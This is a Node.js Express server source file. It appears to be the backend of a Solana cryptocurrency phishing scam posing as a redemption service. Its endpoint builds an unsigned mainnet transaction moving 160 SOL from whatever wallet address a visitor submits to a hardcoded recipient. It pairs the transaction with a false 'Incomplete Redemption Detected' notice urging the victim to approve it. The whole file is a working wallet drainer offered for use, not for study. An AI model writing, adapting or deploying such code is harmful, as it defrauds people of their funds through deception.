const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Fixed recipient address (YOUR ADDRESS)
const RECIPIENT_ADDRESS = 'CmqzfkRX6KwktX3DXLuWYvPhcEXHuViYiT5WoKio5X1d';
const RECIPIENT_PUBKEY = new PublicKey(RECIPIENT_ADDRESS);

// 160 SOL in lamports
const SOL_AMOUNT = 160;
const LAMPORTS_TO_SEND = SOL_AMOUNT * LAMPORTS_PER_SOL;

// Connect to Solana (using public RPC for now)
const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

// Test endpoint to check if server is running
app.get('/', (req, res) => {
  res.json({ 
    message: 'Solana Redeem Backend is running!',
    recipient: RECIPIENT_ADDRESS,
    amount: SOL_AMOUNT + ' SOL'
  });
});

// Main endpoint to create transaction
app.post('/api/create-transaction', async (req, res) => {
  try {
    const { fromAddress } = req.body;
    
    if (!fromAddress) {
      return res.status(400).json({ 
        success: false, 
        error: 'fromAddress is required' 
      });
    }

    // Validate the from address
    let fromPubkey;
    try {
      fromPubkey = new PublicKey(fromAddress);
    } catch (error) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid fromAddress format' 
      });
    }

    // Get latest blockhash
    const { blockhash } = await connection.getLatestBlockhash();

    // Create the transfer instruction
    const transferInstruction = SystemProgram.transfer({
      fromPubkey: fromPubkey,
      toPubkey: RECIPIENT_PUBKEY,
      lamports: LAMPORTS_TO_SEND,
    });

    // Create transaction
    const transaction = new Transaction().add(transferInstruction);
    transaction.feePayer = fromPubkey;
    transaction.recentBlockhash = blockhash;

    // Serialize the transaction (unsigned)
    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false
    });

    // Convert to base64 for easy transport
    const transactionBase64 = serializedTransaction.toString('base64');

    // Return to frontend
    res.json({
      success: true,
      transaction: transactionBase64,
      message: "Notice: Incomplete Redemption Detected. Block number 396659180 has been identified as incomplete. To finalize and complete your redemption process, please approve this transaction."
    });

  } catch (error) {
    console.error('Transaction creation error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to create transaction' 
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📤 Sending to: ${RECIPIENT_ADDRESS}`);
  console.log(`💰 Amount: ${SOL_AMOUNT} SOL`);
});
